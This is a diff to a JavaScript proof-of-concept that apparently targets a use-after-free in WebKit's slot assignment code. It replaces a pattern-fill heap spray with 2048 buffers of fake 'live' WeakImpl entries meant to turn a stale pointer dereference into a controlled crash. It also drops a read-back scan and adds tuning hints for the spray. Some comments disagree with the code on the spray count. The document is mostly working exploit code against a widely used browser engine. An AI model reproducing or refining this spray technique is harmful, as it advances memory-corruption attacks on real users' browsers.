@@ -1032,30 +1032,50 @@ function uafSetup(ghosts, pumpCount, freedSz) {
   // ── slotchange injection window ──────────────────────────────────────────
   // slotchange fires synchronously DURING the re-entrant composed-tree
   // traversal inside slotManualAssignmentDidChange, after the rehash free()
-  // but before the stale effectiveCurrent dereference.
+  // but before the stale effectiveCurrent ptr is dereferenced.
   //
-  // PATTERN FILL (upgraded from zeros):
-  //   Each buf word = 0xUAF00000 | (buf_index << 8) | word_index
-  //   Low bit always 0 → null-ish WeakImpl* (bit0=0 → isLive()=false) → no crash.
-  //   After assign() returns we scan all bufs for words that differ from pattern.
-  //   Mismatch = stale effectiveCurrent ptr wrote into our buf = MEDIUM confirm.
+  // STRATEGY: fake WeakImpl entries (v3 — active signal)
+  //
+  //   Previous zeros-fill: isLive()=false → stale traversal short-circuits
+  //   silently. No write-back from WebKit → pattern scan sees nothing. Dead end.
+  //
+  //   Fix: spray fake bucket entries with m_count=1 (isLive()=true).
+  //   When the stale effectiveCurrent ptr lands in our buf, the cleanup
+  //   traversal sees a "live" entry and tries to dereference the key ptr
+  //   (ManualSlotAssignment*) at buf[0..7]. We set key ptr = 0 (null).
+  //   Null deref on arm64 = SIGBUS/EXC_BAD_ACCESS → caught as JS exception.
+  //   That fires the HARD confirm path.
+  //
+  // WTF::WeakImpl layout (arm64, 16B per entry):
+  //   [0..7]  : key ptr (ManualSlotAssignment*) — set to 0 → controlled null deref
+  //   [8..11] : m_count (uint32) — set to 1 → isLive() returns true
+  //   [12..15]: padding / value ptr — 0
+  //
+  // Each bucket is one WeakImpl entry, so we fill EVERY 16-byte slot of the
+  // freed bucket array with this fake entry layout.
+  //
+  // Note: bucket array = cap × 16B, so freedSz/16 entries per buf.
+  // We allocate 512 bufs at freedSz to maximise chance of hitting the freed slot.
   let injectionFired = false;
   let injectionPool = null;
 
-  // bit0=0 throughout → all ptrs look dead → isLive()=false → no crash
-
   targetSlot.addEventListener('slotchange', () => {
-    // Allocate into the freed bucket slot synchronously
     injectionPool = [];
-    const wordsPerBuf = Math.floor(freedSz / 4);
-    for (let i = 0; i < 512; i++) {
+    const entriesPerBuf = Math.floor(freedSz / 16); // 16B per WeakImpl bucket entry
+    for (let i = 0; i < 2048; i++) {
       const buf = new ArrayBuffer(freedSz);
       const u32 = new Uint32Array(buf);
-      // Pattern: top nibble=0xF (unused by WeakImpl), low 2 bytes = buf/word idx
-      // bit0=0 throughout → all ptrs look dead → isLive()=false → no crash
-      for (let w = 0; w < wordsPerBuf; w++)
-        u32[w] = (0xF0A00000 | ((i & 0xFF) << 8) | (w & 0xFF)) >>> 0;
-      injectionPool.push({ buf, u32, idx: i, sz: freedSz });
+      const u64 = new BigUint64Array(buf);
+      // Fill every bucket slot with a fake live WeakImpl entry:
+      //   u64[0+j*2]   = key ptr = 0 → null deref when traversal reads it
+      //   u32[2+j*4]   = m_count = 1 → isLive() = true
+      //   u32[3+j*4]   = 0
+      for (let j = 0; j < entriesPerBuf; j++) {
+        u64[j * 2]     = 0n;          // key ptr = null (controlled crash)
+        u32[j * 4 + 2] = 1;           // m_count = 1 → isLive() = true
+        u32[j * 4 + 3] = 0;           // value / pad
+      }
+      injectionPool.push({ buf, u32, u64, idx: i, sz: freedSz });
     }
     injectionFired = true;
   });
@@ -1294,47 +1314,6 @@ function checkNodeLeak(nodes, expectedNode) {
         targetSlot.assign(newChild);
         const injectedThisCall = isInjected();
 
-        // ── Pattern read-back scan ─────────────────────────────────────────────
-        // If the stale effectiveCurrent ptr chased into one of our injection bufs,
-        // the WeakHashMap code would have written through it (e.g. clearing a
-        // WeakImpl* field). Any word != our 0xF0A000xx pattern = clobber = MEDIUM.
-        let patternClobbers = [];
-        if (injectedThisCall) {
-          const pool = getPool();
-          if (pool) {
-            for (const entry of pool) {
-              const { u32, idx, sz: bsz } = entry;
-              const wordsToCheck = Math.min(8, Math.floor(bsz / 4));
-              for (let w = 0; w < wordsToCheck; w++) {
-                const expected = (0xF0A00000 | ((idx & 0xFF) << 8) | (w & 0xFF)) >>> 0;
-                if (u32[w] !== expected) {
-                  patternClobbers.push({
-                    bufIdx: idx, word: w,
-                    expected: expected.toString(16).padStart(8,'0'),
-                    got: u32[w].toString(16).padStart(8,'0'),
-                    // Dump first 8 words for analysis
-                    dump: Array.from(u32.slice(0,8)).map(x=>x.toString(16).padStart(8,'0')).join(' ')
-                  });
-                  break; // one hit per buf is enough
-                }
-              }
-              if (patternClobbers.length >= 5) break; // cap log noise
-            }
-          }
-        }
-
-        if (patternClobbers.length > 0) {
-          nodeAnomalies++;  // counts as MEDIUM signal
-          for (const pc of patternClobbers) {
-            if (nodeAnomalyLog.length < 20)
-              nodeAnomalyLog.push(
-                `PATTERN_CLOBBER g=${ghosts} p=${pumpCount} freed=${freedSz}B` +
-                ` buf[${pc.bufIdx}].w[${pc.word}]: exp=${pc.expected} got=${pc.got}` +
-                ` | dump: ${pc.dump}`
-              );
-          }
-        }
-
         // ── Check for stale-read anomaly ──
         const nodes = targetSlot.assignedNodes({ flatten: false });
         host.remove();
@@ -1395,10 +1374,10 @@ function checkNodeLeak(nodes, expectedNode) {
     nodeAnomalyLog.forEach(l => log(`[!!!]   ${l}`));
   }
   if (softSignal && !heapOverlap) {
-    log(`\n[*] SOFT SIGNAL: ${totalInjections} injections — cleanup fired, spray ran`);
-    log('[*] Pattern fill active: buf words set to 0xF0A0{buf}{word}; bit0=0 (safe)');
-    log('[*] No pattern clobbers detected this run — stale ptr may have landed outside spray');
-    log('[*] Try: increase PER_SIZE to 1024, or add a second GC pass before trigger');
+    log(`\n[*] SOFT SIGNAL: ${totalInjections} injections — cleanup fired, fake-WeakImpl spray ran`);
+    log('[*] Fake entries: key=0 (null), m_count=1 (isLive=true) — HARD crash expected if overlap');
+    log('[*] No crash/anomaly yet — stale ptr may still miss the 512-buf window');
+    log('[*] Try: bump injection count to 2048 in uafSetup, or increase ghosts range to 200');
     for (const h of clobberLog.slice(0, 5))
       log(`[*]   ${JSON.stringify(h)}`);
   }
